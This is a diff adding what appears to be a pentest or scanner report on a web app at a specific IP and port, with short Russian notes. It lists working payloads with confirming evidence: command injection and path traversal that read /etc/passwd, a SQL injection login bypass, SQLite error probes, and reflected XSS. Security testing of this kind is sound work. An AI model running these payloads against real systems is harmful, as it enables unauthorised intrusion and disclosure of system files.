@@ -1,0 +1,49 @@
+ 	Remote OS Command Injection
+
+URL 	http://92.51.39.106:7799/server.html
+Method 	POST
+Parameter 	server
+Attack 	127.0.0.1&cat /etc/passwd&
+Evidence 	root:x:0:0
+Other Info 	The scan rule was able to retrieve the content of a file or command by sending [127.0.0.1&cat /etc/passwd&] to the operating system running this application
+
+
+1. в ручную проведена SQL injection
+SQL injection
+
+http://92.51.39.106:7799/server.html
+admin' or 1=1--
+
+URL 	http://92.51.39.106:7799/login.html
+Method 	POST
+Parameter 	password
+Attack 	'(
+Evidence 	near "(": syntax error
+Other Info 	RDBMS [SQLite] likely, given error message regular expression [near ".+": syntax error] matched by the HTML results. The vulnerability was detected by manipulating the parameter to cause a database error message to be returned and recognised
+URL 	http://92.51.39.106:7799/login.html
+Method 	POST
+Parameter 	username
+Attack 	'
+
+
+ 	Path Traversal
+Выведет содержание файла etc/passwd
+http://92.51.39.106:7799/read?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+URL 	http://92.51.39.106:7799/read?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+Method 	GET
+Parameter 	file
+Attack 	../../../../../../../../../../../../../../../../etc/passwd
+Evidence 	root:x:0:0
+
+ 	Cross Site Scripting (Reflected)
+http://92.51.39.106:7799/search?q=%3C%2Fh2%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E
+
+URL 	http://92.51.39.106:7799/search?q=%3C%2Fh2%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E
+Method 	GET
+Parameter 	q
+Attack 	</h2><scrIpt>alert(1);</scRipt><h2>
+Evidence 	</h2><scrIpt>alert(1);</scRipt><h2>
+
+
+
